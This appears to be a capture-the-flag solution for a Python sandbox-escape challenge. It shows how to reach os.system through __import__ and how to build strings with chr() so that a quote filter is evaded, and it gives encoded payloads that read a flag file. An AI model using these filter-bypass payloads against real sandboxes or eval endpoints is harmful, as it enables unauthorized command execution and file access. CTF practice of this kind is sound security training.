# Solution
You have access to global variables (see `g`), just `open` is blacklisted.

That means you can import stuff using `__import__`.

Since `"` and `'` are replaced from the input with an empty string, you need to create your string using `chr(ascii)`

The following executes a system command to print the contents of the file.
##### Windows: 
`__import__("os").system("more flag")`<br>
encoded: `__import__(chr(0x6F)+chr(0x73)).system(chr(0x6D)+chr(0x6F)+chr(0x72)+chr(0x65)+chr(0x20)+chr(0x66)+chr(0x6C)+chr(0x61)+chr(0x67))`
#####
`__import__("os").system("cat flag")`<br>
encoded: `__import__(chr(0x6F)+chr(0x73)).system(chr(0x63)+chr(0x61)+chr(0x74)+chr(0x20)+chr(0x66)+chr(0x6C)+chr(0x61)+chr(0x67))`
